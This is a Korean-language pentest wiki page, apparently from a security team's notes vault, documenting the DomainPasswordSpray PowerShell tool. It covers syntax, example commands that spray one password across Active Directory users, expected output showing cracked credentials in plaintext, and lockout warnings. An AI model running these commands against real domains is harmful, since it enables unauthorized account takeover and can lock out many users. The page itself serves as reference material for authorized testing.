---
tags:
  - 환경/ad
  - 서비스/ldap
  - 기능/인증검증
실행환경: ["Windows PowerShell"]
필요권한: ["자동 사용자 수집과 정책 조회에는 도메인 인증 세션"]
필요조건: ["단일 비밀번호", "사전에 확인한 계정 잠금 정책", "선택적으로 사용자 목록"]
결과: ["인증 결과", "유효 자격 증명"]
---

# DomainPasswordSpray

## 도구 개요

`DomainPasswordSpray.ps1`은 여러 AD 사용자에게 같은 비밀번호를 차례로 시도하는 PowerShell 기반 Password Spraying 도구다. 도메인 사용자와 잠금 정책을 자동으로 확인하고 잠금 임박 계정을 제외하는 기능이 있어 Windows 도메인 세션에서 제한된 spray를 수행할 때 유용하다.

## 필요한 입력과 실행 환경

- 실행 환경: `DomainPasswordSpray.ps1`을 불러올 수 있고 DC에 접근 가능한 Windows PowerShell
- 도메인 인증 상태: 사용자 목록 생성, Fine-Grained Password Policy 확인, 잠금 임박 계정 제외를 자동으로 수행할 수 있음
- 비도메인 인증 상태: `-UserList`로 검증할 사용자 목록을 직접 제공해야 함
- 필수 입력: 한 번의 spray에 사용할 단일 비밀번호와 선택적인 결과 파일. 결과 파일은 Vault 밖의 승인된 경로를 사용한다.

> [!danger] 계정 잠금 위험
> 실행 전에 잠금 임계값, observation window, 이전 실패 횟수를 확인한다. 구현상 사용자 목록을 자동 생성할 때만 `-RemoveDisabled -RemovePotentialLockouts`를 적용한다. `-UserList`를 직접 전달하면 잠금 임계값 검사를 건너뛰므로, 잠금 정책과 각 계정의 현재 실패 횟수로 계산한 간격과 횟수를 직접 지켜야 한다. 짧은 시간에 반복 실행하면 다수 계정을 잠가 서비스 거부를 일으킬 수 있다.

## 표준 사용법

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray [-UserList <USER_LIST>] -Password '<PASSWORD>' [-OutFile '<SPRAY_RESULT_FILE>']
```

## 대표 예시

### 도메인 인증 세션에서 사용자 목록 자동 생성

```powershell
Import-Module .\DomainPasswordSpray.ps1
if (Test-Path -LiteralPath '<SPRAY_RESULT_FILE>') { throw '결과 파일 경로가 이미 존재합니다.' }
Invoke-DomainPasswordSpray -Password '<PASSWORD>' -OutFile '<SPRAY_RESULT_FILE>'
```

확인할 출력:

- `Current domain is compatible with Fine-Grained Password Policy`
- `The smallest lockout threshold discovered in the domain is <COUNT> login attempts`
- disabled 사용자와 잠금까지 한 번 남은 사용자를 제외했다는 메시지
- 실행 전 대상 계정 수를 보여 주는 확인 prompt

### 직접 준비한 사용자 목록에 단일 비밀번호 시도

```powershell
Import-Module .\DomainPasswordSpray.ps1
if (Test-Path -LiteralPath '<SPRAY_RESULT_FILE>') { throw '결과 파일 경로가 이미 존재합니다.' }
Invoke-DomainPasswordSpray -UserList '<USER_LIST>' -Password '<PASSWORD>' -OutFile '<SPRAY_RESULT_FILE>'
```

확인할 출력:

- `Password spraying has begun with 1 passwords`
- 성공 시 `SUCCESS! User:<USER> Password:<PASSWORD>`
- 결과 파일 기록 안내. `<SPRAY_RESULT_FILE>`에는 성공한 사용자명과 평문 비밀번호가 기록된다.

## 주요 옵션

| 옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `-UserList <FILE>` | 직접 준비한 사용자 목록 사용 | 도메인에 인증되지 않았거나 대상 목록을 제한할 때 |
| `-Password '<PASSWORD>'` | 모든 대상 계정에 시도할 단일 비밀번호 | 잠금 정책에 맞춘 한 번의 spray |
| `-OutFile <FILE>` | 성공 결과를 파일에 기록 | 후속 인증 검증용 결과를 분리할 때 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| `smallest lockout threshold` | 도메인에서 확인한 가장 보수적인 잠금 임계값 | 대상 계정의 현재 실패 횟수와 실행 간격 재검토 |
| `Removing users within 1 attempt of locking out` | 잠금 임박 계정을 자동 생성 목록에서 제외 | 제외가 적용된 자동 수집 모드인지 확인 |
| `Confirm Password Spray` | 실제 인증 시도 직전의 대상 수 확인 단계 | 입력 목록과 예상 대상 수가 맞지 않으면 중단 |
| `SUCCESS! User:...` | 사용자와 비밀번호 조합이 유효함 | 별도 서비스에서 최소 횟수로 인증과 권한 범위 검증 |
| 성공 없음 | 유효 조합 미발견 또는 인증/정책 조건 불일치 | 즉시 반복하지 말고 정책 window와 입력 목록 확인 |
| 계정 잠금 징후 | 실패 횟수 누적 또는 정책 계산 불일치 | 모든 spray 중단 후 잠금 해제 정책과 영향 확인 |

## 생성 파일과 잔여 영향

- 실행 실패도 계정 실패 카운터와 DC 감사 기록을 남길 수 있다. 로컬 파일 삭제는 이 원격 영향을 복원하지 않으며, 잠금 해제나 비밀번호 변경은 별도 승인 없이는 수행하지 않는다.
- `<SPRAY_RESULT_FILE>`의 인계가 끝나면 이번 실행이 만든 정확한 파일만 삭제한다. 기존 파일을 덮어쓰지 않도록 실행 전 `Test-Path` 기준선을 남긴다.

```powershell
if (Test-Path -LiteralPath '<SPRAY_RESULT_FILE>') { Remove-Item -LiteralPath '<SPRAY_RESULT_FILE>' }
Test-Path -LiteralPath '<SPRAY_RESULT_FILE>'
```

마지막 출력이 `False`여야 로컬 파일 정리가 확인된다. 계정 실패 카운터·잠금 상태와 서버 감사 기록은 [[내부 AD Password Spraying]]의 완료 조건으로 별도 확인한다.

## 관련 공격기법

- [[내부 AD Password Spraying]]

## 참고 링크

- [DomainPasswordSpray 공식 저장소](https://github.com/dafthack/DomainPasswordSpray)
- [DomainPasswordSpray.ps1 구현 — 자동 목록과 `-UserList` 경계](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
